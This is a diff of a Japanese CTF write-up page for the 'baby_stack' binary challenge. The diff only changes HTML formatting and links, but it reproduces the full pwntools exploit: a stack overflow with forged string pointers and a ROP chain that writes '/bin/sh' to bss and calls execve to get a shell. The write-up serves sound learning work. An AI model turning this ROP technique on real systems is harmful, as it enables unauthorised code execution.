@@ -15,22 +15,22 @@
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.1/css/academicons.min.css" integrity="sha512-b1ASx0WHgVFL5ZQhTgiPWX+68KjS38Jk87jg7pe+qC7q9YkEtFq0z7xCglv7qGIs/68d3mAp+StfC8WKC5SSAg==" crossorigin="anonymous" />
 
 
-<link rel="stylesheet" href="https://team-enu.github.io/css/palettes/base16-dark.css">
-<link rel="stylesheet" href="https://team-enu.github.io/css/risotto.css">
-<link rel="stylesheet" href="https://team-enu.github.io/css/custom.css">
+<link rel="stylesheet" href="/css/palettes/base16-dark.css">
+<link rel="stylesheet" href="/css/risotto.css">
+<link rel="stylesheet" href="/css/custom.css">
 </head>
 
     <body>
         <div class="page">
 
-            <header class="page__header"><h1 class="page__logo"><a href="https://team-enu.github.io" class="page__logo-inner">Team Enu</a></h1>
+            <header class="page__header"><h1 class="page__logo"><a href="/" class="page__logo-inner">Team Enu</a></h1>
 <nav class="page__nav main-nav">
     <ul>
     
     
-    <li class="main-nav__item"><a class="nav-main-item" href="https://team-enu.github.io/writeups/" title="">Writeups</a></li>
+    <li class="main-nav__item"><a class="nav-main-item" href="/writeups/" title="">Writeups</a></li>
     
-    <li class="main-nav__item"><a class="nav-main-item" href="https://team-enu.github.io/news/" title="">News</a></li>
+    <li class="main-nav__item"><a class="nav-main-item" href="/news/" title="">News</a></li>
     
     </ul>
 </nav>
@@ -441,16 +441,16 @@ gef➤ dereference
      そこで、実行ファイル中に存在する文字列である <code>&#34;Please&#34;</code> を代わりの文字列として使用する。
      先程まで利用していたpatternに、上記の値を格納して、再度プログラムを実行してみる。</p>
 <div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>  pattern <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaac&#39;</span>
-</span></span><span style="display:flex;"><span>  buf2 <span style="color:#f92672">=</span> list(pattern)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># msg</span>
-</span></span><span style="display:flex;"><span>  buf2[<span style="color:#ae81ff">0xc8</span>:<span style="color:#ae81ff">0xd0</span>] <span style="color:#f92672">=</span> p64(please_ptr) <span style="color:#75715e"># string ptr</span>
-</span></span><span style="display:flex;"><span>  buf2[<span style="color:#ae81ff">0xd0</span>:<span style="color:#ae81ff">0xd8</span>] <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x6</span>)        <span style="color:#75715e"># string size</span>
-</span></span><span style="display:flex;"><span>  buf2[<span style="color:#ae81ff">0xd0</span>:<span style="color:#ae81ff">0xd8</span>] <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x6</span>)        <span style="color:#75715e"># string size</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  buf2 <span style="color:#f92672">=</span> buf2[:<span style="color:#ae81ff">0x1f8</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x60</span>]
-</span></span><span style="display:flex;"><span>  buf2 <span style="color:#f92672">=</span> bytes(buf2)</span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">  pattern <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaac&#39;</span>
+  buf2 <span style="color:#f92672">=</span> list(pattern)
+
+  <span style="color:#75715e"># msg</span>
+  buf2[<span style="color:#ae81ff">0xc8</span>:<span style="color:#ae81ff">0xd0</span>] <span style="color:#f92672">=</span> p64(please_ptr) <span style="color:#75715e"># string ptr</span>
+  buf2[<span style="color:#ae81ff">0xd0</span>:<span style="color:#ae81ff">0xd8</span>] <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x6</span>)        <span style="color:#75715e"># string size</span>
+  buf2[<span style="color:#ae81ff">0xd0</span>:<span style="color:#ae81ff">0xd8</span>] <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x6</span>)        <span style="color:#75715e"># string size</span>
+
+  buf2 <span style="color:#f92672">=</span> buf2[:<span style="color:#ae81ff">0x1f8</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x60</span>]
+  buf2 <span style="color:#f92672">=</span> bytes(buf2)</code></pre></div>
 </div>
 <p>
      すると、今度は以下のようなエラーが出力される。</p>
@@ -544,20 +544,20 @@ gef➤ dereference
 <p>
     そこで、 <code>pop レジスタ; ret;</code> となるガジェットを探し、それぞれのレジスタを設定する。</p>
 <div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>  <span style="color:#75715e">## 0x00000000004026da: syscall;</span>
-</span></span><span style="display:flex;"><span>  syscall <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004026da</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e">## 0x0000000000470931: pop rdi; or byte ptr [rax + 0x39], cl; ret;</span>
-</span></span><span style="display:flex;"><span>  pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000470931</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e">## 0x000000000046defd: pop rsi; ret;</span>
-</span></span><span style="display:flex;"><span>  pop_rsi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000046defd</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e">## 0x00000000004016ea: pop rax; ret;</span>
-</span></span><span style="display:flex;"><span>  pop_rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004016ea</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e">## 0x0000000000448145: pop rdx; setbe byte ptr [rsp + 0x50]; add rsp, 0x38; ret;</span>
-</span></span><span style="display:flex;"><span>  pop_rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000448145</span></span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">  <span style="color:#75715e">## 0x00000000004026da: syscall;</span>
+  syscall <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004026da</span>
+
+  <span style="color:#75715e">## 0x0000000000470931: pop rdi; or byte ptr [rax + 0x39], cl; ret;</span>
+  pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000470931</span>
+
+  <span style="color:#75715e">## 0x000000000046defd: pop rsi; ret;</span>
+  pop_rsi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000046defd</span>
+
+  <span style="color:#75715e">## 0x00000000004016ea: pop rax; ret;</span>
+  pop_rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004016ea</span>
+
+  <span style="color:#75715e">## 0x0000000000448145: pop rdx; setbe byte ptr [rsp + 0x50]; add rsp, 0x38; ret;</span>
+  pop_rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000448145</span></code></pre></div>
 </div>
 <p>それぞれ、使えそうなガジェットをropper集める。ここで、今回使用するガジェットで、 <code>pop rdi</code> を行うガジェットと <code>pop rdx</code> を行うガジェットはそれぞれ扱いに注意が必要である。</p>
 <p>
@@ -581,23 +581,23 @@ gef➤ dereference
 <li>
 <p>レジスタ1 ( <code>rdi</code> )に文字列を書き込みたいアドレス( <code>bss_addr</code> )を格納</p>
 <div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>buf <span style="color:#f92672">=</span> p64(pop_rdi)
-</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p64(bss_addr)</span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">buf <span style="color:#f92672">=</span> p64(pop_rdi)
+buf <span style="color:#f92672">+=</span> p64(bss_addr)</code></pre></div>
 </div>
 </li>
 <li>
 <p>レジスタ2( <code>rax</code> )に書き込みたい文字列( <code>&#34;/bin/sh&#34;</code> )を格納</p>
 <div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p64(pop_rax)
-</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span></span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">buf <span style="color:#f92672">+=</span> p64(pop_rax)
+buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span></code></pre></div>
 </div>
 </li>
 <li>
 <p><code>mov [レジスタ1], レジスタ2</code> の形のガジェットを利用し、レジスタ1の指すアドレスにレジスタ2の内容を書き込み</p>
 <div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">## 0x0000000000456499: mov qword ptr [rdi], rax; ret;</span>
-</span></span><span style="display:flex;"><span>mov_rdi_rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000456499</span>
-</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p64(mov_rdi_rax)</span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">## 0x0000000000456499: mov qword ptr [rdi], rax; ret;</span>
+mov_rdi_rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000456499</span>
+buf <span style="color:#f92672">+=</span> p64(mov_rdi_rax)</code></pre></div>
 </div>
 </li>
 </ol>
@@ -619,86 +619,86 @@ solver
 </h4>
 <div id="outline-text-headline-13" class="outline-text-4">
 <div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>   <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8&#39;</span>
-</span></span><span style="display:flex;"><span>   chall <span style="color:#f92672">=</span> ELF(filename)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   <span style="color:#75715e"># socat TCP-LISTEN:8000,reuseaddr,fork EXEC:&#34;./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8&#34;</span>
-</span></span><span style="display:flex;"><span>   conn <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;localhost&#39;</span>, <span style="color:#ae81ff">8000</span>)
-</span></span><span style="display:flex;"><span>   <span style="color:#75715e"># conn = process(filename)</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   <span style="color:#75715e"># ROP Gadgets</span>
-</span></span><span style="display:flex;"><span>   bss_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000058e000</span>
-</span></span><span style="display:flex;"><span>   hoge_str <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000c8200a2000</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   <span style="color:#75715e">## 0x00000000004026da: syscall;</span>
-</span></span><span style="display:flex;"><span>   syscall <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004026da</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   <span style="color:#75715e">## 0x0000000000470931: pop rdi; or byte ptr [rax + 0x39], cl; ret;</span>
-</span></span><span style="display:flex;"><span>   pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000470931</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   <span style="color:#75715e">## 0x0000000000456499: mov qword ptr [rdi], rax; ret;</span>
-</span></span><span style="display:flex;"><span>   mov_rdi_rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000456499</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   <span style="color:#75715e">## 0x000000000046defd: pop rsi; ret;</span>
-</span></span><span style="display:flex;"><span>   pop_rsi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000046defd</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   <span style="color:#75715e">## 0x00000000004016ea: pop rax; ret;</span>
-</span></span><span style="display:flex;"><span>   pop_rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004016ea</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   <span style="color:#75715e">## 0x0000000000448145: pop rdx; setbe byte ptr [rsp + 0x50]; add rsp, 0x38; ret;</span>
-</span></span><span style="display:flex;"><span>   pop_rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000448145</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   <span style="color:#75715e">## static string</span>
-</span></span><span style="display:flex;"><span>   please_ptr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x521f00</span>
-</span></span><span style="display:flex;"><span>   please_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x6</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   <span style="color:#75715e"># Input name (First input)</span>
-</span></span><span style="display:flex;"><span>   buf1 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;hoge&#34;</span>
-</span></span><span style="display:flex;"><span>   conn<span style="color:#f92672">.</span>sendline(buf1)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   <span style="color:#75715e"># Input msg (Second input)</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#75715e">## name string</span>
-</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x68</span>
-</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> p64(please_ptr)
-</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> p64(please_size)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   <span style="color:#75715e">## msg string</span>
-</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0xc8</span><span style="color:#f92672">-</span>len(buf2))
-</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> p64(please_ptr)
-</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> p64(please_size)
-</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> p64(please_size)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x198</span><span style="color:#f92672">-</span>len(buf2))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   <span style="color:#75715e"># ROP</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#75715e">## rdx = 0</span>
-</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> p64(pop_rdx)
-</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span>)
-</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x38</span>    <span style="color:#75715e"># add rsp, 0x38</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   <span style="color:#75715e">## rsi = 0</span>
-</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> p64(pop_rsi)
-</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   <span style="color:#75715e">## rdi = &#34;/bin/sh&#34;</span>
-</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> p64(pop_rax)
-</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> p64(bss_addr) <span style="color:#75715e"># initialize rax with bss_addr</span>
-</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> p64(pop_rdi)
-</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> p64(bss_addr)
-</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> p64(pop_rax)
-</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> p64(mov_rdi_rax)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   <span style="color:#75715e">## rax = 59</span>
-</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> p64(pop_rax)
-</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">59</span>)      <span style="color:#75715e"># execve</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   <span style="color:#75715e">## execve(&#34;/bin/sh&#34;, 0, 0)</span>
-</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> p64(syscall)
-</span></span><span style="display:flex;"><span>   conn<span style="color:#f92672">.</span>sendline(buf2)
-</span></span><span style="display:flex;"><span>   conn<span style="color:#f92672">.</span>interactive()</span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">   <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+   filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8&#39;</span>
+   chall <span style="color:#f92672">=</span> ELF(filename)
+
+   <span style="color:#75715e"># socat TCP-LISTEN:8000,reuseaddr,fork EXEC:&#34;./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8&#34;</span>
+   conn <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;localhost&#39;</span>, <span style="color:#ae81ff">8000</span>)
+   <span style="color:#75715e"># conn = process(filename)</span>
+
+   <span style="color:#75715e"># ROP Gadgets</span>
+   bss_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000058e000</span>
+   hoge_str <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000c8200a2000</span>
+
+   <span style="color:#75715e">## 0x00000000004026da: syscall;</span>
+   syscall <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004026da</span>
+
+   <span style="color:#75715e">## 0x0000000000470931: pop rdi; or byte ptr [rax + 0x39], cl; ret;</span>
+   pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000470931</span>
+
+   <span style="color:#75715e">## 0x0000000000456499: mov qword ptr [rdi], rax; ret;</span>
+   mov_rdi_rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000456499</span>
+
+   <span style="color:#75715e">## 0x000000000046defd: pop rsi; ret;</span>
+   pop_rsi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000046defd</span>
+
+   <span style="color:#75715e">## 0x00000000004016ea: pop rax; ret;</span>
+   pop_rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004016ea</span>
+
+   <span style="color:#75715e">## 0x0000000000448145: pop rdx; setbe byte ptr [rsp + 0x50]; add rsp, 0x38; ret;</span>
+   pop_rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000448145</span>
+
+   <span style="color:#75715e">## static string</span>
+   please_ptr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x521f00</span>
+   please_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x6</span>
+
+   <span style="color:#75715e"># Input name (First input)</span>
+   buf1 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;hoge&#34;</span>
+   conn<span style="color:#f92672">.</span>sendline(buf1)
+
+   <span style="color:#75715e"># Input msg (Second input)</span>
+   <span style="color:#75715e">## name string</span>
+   buf2 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x68</span>
+   buf2 <span style="color:#f92672">+=</span> p64(please_ptr)
+   buf2 <span style="color:#f92672">+=</span> p64(please_size)
+
+   <span style="color:#75715e">## msg string</span>
+   buf2 <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0xc8</span><span style="color:#f92672">-</span>len(buf2))
+   buf2 <span style="color:#f92672">+=</span> p64(please_ptr)
+   buf2 <span style="color:#f92672">+=</span> p64(please_size)
+   buf2 <span style="color:#f92672">+=</span> p64(please_size)
+
+   buf2 <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x198</span><span style="color:#f92672">-</span>len(buf2))
+
+   <span style="color:#75715e"># ROP</span>
+   <span style="color:#75715e">## rdx = 0</span>
+   buf2 <span style="color:#f92672">+=</span> p64(pop_rdx)
+   buf2 <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span>)
+   buf2 <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x38</span>    <span style="color:#75715e"># add rsp, 0x38</span>
+
+   <span style="color:#75715e">## rsi = 0</span>
+   buf2 <span style="color:#f92672">+=</span> p64(pop_rsi)
+   buf2 <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span>)
+
+   <span style="color:#75715e">## rdi = &#34;/bin/sh&#34;</span>
+   buf2 <span style="color:#f92672">+=</span> p64(pop_rax)
+   buf2 <span style="color:#f92672">+=</span> p64(bss_addr) <span style="color:#75715e"># initialize rax with bss_addr</span>
+   buf2 <span style="color:#f92672">+=</span> p64(pop_rdi)
+   buf2 <span style="color:#f92672">+=</span> p64(bss_addr)
+   buf2 <span style="color:#f92672">+=</span> p64(pop_rax)
+   buf2 <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>
+   buf2 <span style="color:#f92672">+=</span> p64(mov_rdi_rax)
+
+   <span style="color:#75715e">## rax = 59</span>
+   buf2 <span style="color:#f92672">+=</span> p64(pop_rax)
+   buf2 <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">59</span>)      <span style="color:#75715e"># execve</span>
+
+   <span style="color:#75715e">## execve(&#34;/bin/sh&#34;, 0, 0)</span>
+   buf2 <span style="color:#f92672">+=</span> p64(syscall)
+   conn<span style="color:#f92672">.</span>sendline(buf2)
+   conn<span style="color:#f92672">.</span>interactive()</code></pre></div>
 </div>
 </div>
 </div>
@@ -748,7 +748,7 @@ updated 2023/2/28</p>
             <section class="page__aside">
                 <div class="aside__about">
 <div class="aside__about">
-    <img class="about__logo" src="https://team-enu.github.io/team-enu.png" alt="Logo">
+    <img class="about__logo" src="/team-enu.png" alt="Logo">
 <h1 class="about__title">Team Enu</h1>
 <p class="about__description">Team EnuのWriteupや活動の紹介を掲載しています。</p>
 </div>
